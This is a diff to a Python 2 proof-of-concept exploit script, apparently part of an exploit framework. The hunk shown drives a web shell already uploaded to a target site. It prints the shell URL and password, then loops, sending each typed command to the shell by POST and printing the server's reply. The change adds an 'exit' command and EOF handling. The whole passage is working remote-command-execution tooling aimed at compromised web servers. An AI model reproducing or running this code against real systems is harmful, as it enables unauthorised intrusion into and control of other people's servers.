@@ -40,14 +40,23 @@ def poc():
 		shell = target.url.replace("index.php", "upload/" + path)
 		print "[*] The shell url: " + shell
 		print "[*] The shell password: " + password
-		while 1:
-			command = raw_input("[*] input the command:")
-			if command:
-				payload = {
-					password : command
-				}
-				r = requests.post(shell, data=payload)
-				print r.text
 
+		flag = 1
+		while flag:
+			try:
+				command = raw_input("[*] input the command:")
+				if command != "exit":
+					payload = {
+						password : command
+					}
+					r = requests.post(shell, data=payload)
+					print r.text
+				else:
+					flag = 0
+			except EOFError as e:
+				print "[*] type 'exit' to quit"
+				pass
+
+		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
 	except KeyError as e:
 		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
